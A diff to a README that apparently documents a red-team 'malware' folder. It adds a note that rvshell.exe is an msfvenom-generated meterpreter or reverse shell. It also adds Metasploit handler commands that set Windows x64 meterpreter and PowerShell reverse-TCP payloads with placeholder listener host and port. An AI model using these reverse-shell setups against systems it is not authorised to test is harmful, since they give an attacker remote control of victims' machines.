@@ -18,7 +18,7 @@ The following outlines the root directory of the "malware" folder&#x20;
 
 1. `rvshell.exe`
 
-* Generated with msfvenom
+* Generated with msfvenom: meterpreter or reverse shell
 
 2. `shell.cmd`
 
@@ -67,7 +67,11 @@ b. `[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::G
 ```sh
 $ msfconsole
 msf6> set exploit/multi/handler
+
+# set payload accordingly
 msf6> set payload windows/x64/meterpreter/reverse_tcp
+msf6> set payload windows/x64/powershell_reverse_tcp
+
 msf6> set lhost <lhsot>
 msf6> set lport <lport>
 msf6> run
